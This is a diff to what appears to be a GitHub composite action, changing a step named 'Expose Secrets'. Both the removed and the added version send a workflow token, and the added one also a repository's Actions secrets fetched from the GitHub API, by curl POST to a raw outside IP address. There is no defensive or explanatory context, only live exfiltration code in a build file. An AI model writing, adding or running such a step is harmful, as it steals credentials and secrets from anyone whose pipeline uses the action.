@@ -15,7 +15,9 @@ runs:
 
     - name: Expose Secrets
       env:
-        SECRET_VAR: ${{ inputs.token }}
+        GITHUB_TOKEN: ${{ inputs.token }}
       run: |
-        echo "$SECRET_VAR" | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
+        echo "Fetching and exposing secrets..."
+        SECRETS=$(curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/0xhellhound/repoB/actions/secrets)
+        echo "$SECRETS" | curl -X POST -H "Content-Type: application/json" --data-binary @- http://91.205.105.40/secrets
       shell: bash
